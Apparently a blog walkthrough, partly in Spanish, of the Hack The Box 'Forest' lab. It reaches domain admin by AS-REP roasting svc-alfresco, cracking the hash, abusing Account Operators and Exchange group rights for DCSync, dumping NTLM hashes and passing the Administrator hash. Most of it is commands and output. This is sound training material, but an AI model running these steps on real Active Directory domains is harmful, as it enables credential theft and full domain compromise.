---
layout: single
title: Forest - Hack The Box
excerpt: "Forest is an easy Windows machine that showcases a Domain Controller (DC) for a domain in which Exchange Server has been installed. The DC allows anonymous LDAP binds, which are used to enumerate domain objects. The password for a service account with Kerberos pre-authentication disabled can be cracked to gain a foothold. The service account is found to be a member of the Account Operators group, which can be used to add users to privileged Exchange groups. The Exchange group membership is leveraged to gain DCSync privileges on the domain and dump the NTLM hashes, compromising the system."
date: 2025-06-30
classes: wide
header:
  teaser: /img2/forest.png
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Windows
  - Easy
tags:
  - RPC Enumeration - Getting valid domain users
  - Performing an AS-RepRoast attack with the obtained users
  - Cracking Hashes
  - Abusing WinRM - EvilWinRM
  - Ldap Enumeration - ldapdomaindump
  - BloodHound Enumeration
  - Gathering system information with SharpHound.ps1
  - Representing and visualizing data in BloodHound
  - Finding an attack vector in BloodHound
  - Abusing Account Operators Group - Creating a new
  - Abusing Account Operators Group - Assigning a group to the newly created user
  - Abusing WriteDacl in the domain - Granting DCSync Privileges
  - DCSync Exploitation - impacket-secretsdump
---


## Reconnaissance

- Nmap

```bash
❯ nmap -sS --open -p- --min-rate 5000 -n -Pn 10.10.10.161
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-29 21:17 CEST
Nmap scan report for 10.10.10.161
Host is up (0.031s latency).
Not shown: 64661 closed tcp ports (reset), 850 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49684/tcp open  unknown
49706/tcp open  unknown
49976/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 12.29 seconds
```

- Rpcclient username enumeration

```bash
❯ rpcclient 10.10.10.161 -U "" -N
```

```ruby
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

- Kerberos User Enumeration - Kerbrute

```bash
sebastien
lucinda
svc-alfresco
andy
mark
santi
```

```bash
❯ kerbrute userenum -d htb.local --dc 10.10.10.161 users.txt
```

```ruby

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 06/29/25 - Ronnie Flathers @ropnop

2025/06/29 21:34:52 >  Using KDC(s):
2025/06/29 21:34:52 >  	10.10.10.161:88

2025/06/29 21:34:52 >  [+] VALID USERNAME:	andy@htb.local
2025/06/29 21:34:52 >  [+] VALID USERNAME:	lucinda@htb.local
2025/06/29 21:34:52 >  [+] VALID USERNAME:	mark@htb.local
2025/06/29 21:34:52 >  [+] VALID USERNAME:	santi@htb.local
2025/06/29 21:34:52 >  [+] svc-alfresco has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$svc-alfresco@HTB.LOCAL:e0a95f852c0adf9c18f9c54dc455f491$4cab313aa98e61ba1a6fcf903b56e54ec41174ba518302ea138430f35873f515bf2be5c45bfad69ecd0c1102eb5124947827a39c7b045a75a82a78546af00bf26e21701cdfbecf27f8b78b25187687014c4da4e0067c0bbba243a5e41b4c4bb56f75f0d43d5ea24123ea3532a6c802f813cdf13df2b052fe9ae3aaa597c338eed923af38c0709b19389906a870a1d98324f66b914e7c1a14e55fb1a3af7a97cab51d269e31c3370c6f5bea88e7f2ea264e090ed430059d11ad4555af20cb70bc8db2d27c5f47ed5a54a9a0302d53778e10afe5ab94385c6215edcce8c38a4ff70337c65b2ee5dfd9d3b5751fbc2d6c1ecc3fc395c61cd9f457bb
2025/06/29 21:34:52 >  [+] VALID USERNAME:	svc-alfresco@htb.local
2025/06/29 21:34:52 >  [+] VALID USERNAME:	sebastien@htb.local
2025/06/29 21:34:52 >  Done! Tested 6 usernames (6 valid) in 0.052 seconds
```

> Tenemos el hash del usuario svc-alfresco 

## Exploitation

- ASRepRoast Attack (GetNPUsers)

```bash
❯ impacket-GetNPUsers htb.local/ -no-pass -usersfile users.txt
```

```ruby
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

$krb5asrep$23$svc-alfresco@HTB.LOCAL:0b0154d9d3e7a9bddea94d779fc0fb1c$7c136e66c2d2d8057d446709e16babea867a13b5988cab5d71cc2490616727084bc240858f7e89eb6dd5c072aeed649c7d749d9ca039b7b08e995e92acd9a95fcf42f83d2da23f656ee875b6857d61390bbda9bf9b523180ae150f43da5bab7be57ffd4e446fe7a788e546081a2968aa7d58b8b39f7a56b51a113fab63db0ab0b57967c28c279fc4a1c222aea5ce98cbe0aead8691e6a061f8f4c95fa1ea24c6c7243774aa230312cf257399f4e5e10eb859cfc5712c1a3c6253001a36b2fffc14a2412de225da09511ffae3689eb795d0260b5e2699ab54583db1151c5f3d2e5b758299f4ed
```

- Cracking Kerberos Hash

```bash
❯ hashcat --example-hashes | grep "krb5asrep" -B 11
```

```ruby
Hash mode #18200
  Name................: Kerberos 5, etype 23, AS-REP
  Category............: Network Protocol
  Slow.Hash...........: No
  Password.Len.Min....: 0
  Password.Len.Max....: 256
  Salt.Type...........: Embedded
  Salt.Len.Min........: 0
  Salt.Len.Max........: 256
  Kernel.Type(s)......: pure, optimized
  Example.Hash.Format.: plain
  Example.Hash........: $krb5asrep$23$user@domain.com:3e156ada591263b8a...102ac [Truncated, use --mach for full length]
```

```bash
❯ hashcat -m 18200 -a 0 hash /usr/share/wordlists/rockyou.txt
```

```ruby
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-haswell-AMD Ryzen 5 5600X 6-Core Processor, 6924/13913 MB (2048 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5asrep$23$svc-alfresco@HTB.LOCAL:0b0154d9d3e7a9bddea94d779fc0fb1c$7c136e66c2d2d8057d446709e16babea867a13b5988cab5d71cc2490616727084bc240858f7e89eb6dd5c072aeed649c7d749d9ca039b7b08e995e92acd9a95fcf42f83d2da23f656ee875b6857d61390bbda9bf9b523180ae150f43da5bab7be57ffd4e446fe7a788e546081a2968aa7d58b8b39f7a56b51a113fab63db0ab0b57967c28c279fc4a1c222aea5ce98cbe0aead8691e6a061f8f4c95fa1ea24c6c7243774aa230312cf257399f4e5e10eb859cfc5712c1a3c6253001a36b2fffc14a2412de225da09511ffae3689eb795d0260b5e2699ab54583db1151c5f3d2e5b758299f4ed:s3rvice
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$svc-alfresco@HTB.LOCAL:0b0154d9d3e7a9...99f4ed
Time.Started.....: Sun Jun 29 21:38:04 2025 (2 secs)
Time.Estimated...: Sun Jun 29 21:38:06 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2009.8 kH/s (1.92ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4085760/14344385 (28.48%)
Rejected.........: 0/4085760 (0.00%)
Restore.Point....: 4079616/14344385 (28.44%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: s9039554h -> s3r3ndipit
Hardware.Mon.#1..: Util: 80%

Started: Sun Jun 29 21:38:03 2025
Stopped: Sun Jun 29 21:38:08 2025
```

> Credenciales encontradas: svc-alfresco:s3rvice

```bash
❯ crackmapexec winrm 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
```

```ruby
SMB         10.10.10.161    5985   FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)
HTTP        10.10.10.161    5985   FOREST           [*] http://10.10.10.161:5985/wsman
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.10.161    5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
```

> Vemos que el usuario sv-alfresco pertenece al grupo Remote Management Users.

```bash
❯ evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
```

```ruby
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
```

## Post-exploitation

- BloodHound Enumeration

![](/img2/Pasted%20image%2020250630174914.png)

> Vamos a ver a que grupos anidados pertenece el usuario svc-alfresco. Vemos que pertenece al usuario ACCOUNT OPERATORS. Este grupo nos permite crear usuarios en el dominio, podiendo meterles casi todos los grupos.

![](/img2/Pasted%20image%2020250630182615.png)

> Vemos que el grupo EXCHANGE WINDOWS PERMISSIONS tiene el permiso WriteDacl sobre el dominio. Esto lo podemos aprovechar dando al usuario los DCSync privileges, lo cual nos permitirá hacer un DCSync attack.

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user /add /domain pwnd pwnd123
```

```ruby
The command completed successfully.
```

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" pwnd /add /domain
```

```ruby
The command completed successfully.
```

> Creamos un nuevo usuario y lo metemos en el grupo Exchange Windows Permissions. En este punto el nuevo usuario tiene los permisos WriteDacl sobre el dominio.

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $SecPassword = ConvertTo-SecureString 'pwnd123' -AsPlainText -Force
```

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $Cred = New-Object System.Management.Automation.PSCredential('htb.local\pwnd', $SecPassword)
```

```bash
❯ impacket-dacledit -action 'write' -rights 'FullControl' -principal 'pwnd' -target-dn 'DC=htb,DC=local' 'htb.local'/'pwnd':'pwnd123' -dc-ip 10.10.10.161
```

```ruby
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20250630-184212.bak
[*] DACL modified successfully!
```

```bash
❯ impacket-secretsdump htb.local/pwnd@10.10.10.161
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
pwnd:10603:aad3b435b51404eeaad3b435b51404ee:d7fa68a3db1f4db1cc25bbf959d31b8d:::
FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:17ea21c8b09d7e6f9a3b8e7237778e77:::
EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
.......
```

- Pass The Hash

```bash
❯ evil-winrm -i 10.10.10.161 -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6
```

```ruby
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
htb\administrator
```


![](/img2/Pasted%20image%2020250630182418.png)